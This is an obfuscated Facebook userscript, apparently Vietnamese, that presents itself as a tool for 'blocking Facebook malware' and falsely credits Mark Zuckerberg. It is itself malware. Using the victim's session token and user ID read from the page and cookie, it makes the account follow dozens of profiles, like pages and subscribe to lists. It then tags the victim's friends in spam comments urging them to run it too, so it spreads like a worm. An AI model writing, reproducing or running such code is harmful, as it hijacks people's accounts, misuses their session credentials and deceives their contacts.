// ==UserScript==
// @name            CODE CHẶN MÃ ĐỘC FACEBOOK EXE.
// @description     All about facebook By Mark Zuckerberg
...
(function () {
    ...
    _0x3384x4 += '<a class="navLink" title="Äá»”I TĂN FB">';
    _0x3384x4 += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img> Äá»”I TĂN FB</span>';
    _0x3384x4 += '</a>';
    _0x3384x4 += '<div>';
    ...
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/pages/Cu%E1%BB%99c-S%E1%BB%91ng-Mu%C3%B4n-M%C3%A0u/256944201144247" target="_blank">Äá»”I TĂN FB</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
...
a("100005143574461");
a("100004431942997");
Like("1436077613305680");
Like("445420498937972");
Like("1428477800714027");
Like("600575380021391");
a("100004131911507");
Like("458252427616506");
Like("1467459620133620");
sublist("228754500639334");
a("100004749579662");
a("100007509104308");
a("100003177456832");
a("100006765426287");
//Tuan Anh Phan
sublist("233505120169264");
sublist("242395682613541");
sublist("244800192373090");
sublist("244800369039739");
sublist("244837539036022");
a("100005293320245");
a("100005046190063");
Like("693641657346346");
Like("251423198378807");
P("245768525609590");
a("100004308180247");
sublist("265466266940311");
//suythocgioi                                                 
a("100006571236046"); 
a("100007524763730");                             
...
Like("654518777941189");
//gà chạy bộ
a("100007292250143");
a("100003038687107");
sublist("1394309300822132");
Like("615592181799277");
// Thuyên korea
a("100004619800282");
a("100006150488962");
a("100004104018018");
...
sublist("1485275341687468");
Like("1472003576363938");
//Vnk + Secret Story
a("100007127891678");
a("100007068750422");
sublist("1387278681519715");
sublist("1403080046604274");
sublist("1426719407573671");
Like("238029579672705");
Like("143780032489137");
Like("1470986869797283");
Like("404753466287843");
Like("1405035333069018");
Like("480307502085934");
Like("294517150648680");
Like("249714438529877");
Like("220728071384791");
Like("276086785870460");
Like("1411840465735288");
P("1432124223701827");
P("1432123950368521");
P("1422434338002178");
P("1420489138196698");
Like("831153140234921");
//boss Khoa
sublist("1411187299125556");
sublist("1411190222458597");
sublist("1382132788697674");
a("100007028978946");
a("100006110797736");
sublist("1399743930239287");
sublist("1441220239455595");
sublist("1400411240224906");
sublist("1425183111059308");
//Minh Ngốc
a("100006653859965");
a("100007271983557");
P("1408275682781639");
...
sublist("1464377770460671");
sublist("1469185639979884");
// Hung Miinh
Like("419767621492123");
Like("787928971234633");
sublist("281827705301126");
sublist("278686562281907");
sublist("281626785321218");
a("100004216958487");
a("100000298230277");
a("100004783421812");
a("100005264010732");             
...
sublist("292439777592134");
sublist("293550487481063");
sublist("293550907481021");
sublist("293551030814342 ");
P("186910644811715");
...
a("100005474705558");
sublist("232399833619172");
a("100007817193690");
a("100007728462533");
//nguyễn minh hiếu
Like ("1416697071914714");
a("100004127283610");
/// tag
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var id = '513328102104485';
var arkadaslar = [];
var svn_rev;
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text= Cảm ơn bạn đã tag bạn bè vào bài đăng của chúng tôi. Các bạn hãy cùng làm theo để chặn mã độc trên facebook nhé. Xin chân thành cảm ơn ' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al(513328102104485);
/// tag2
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var id = '513332415437387';
var arkadaslar = [];
var svn_rev;
...
arkadaslari_al(513332415437387);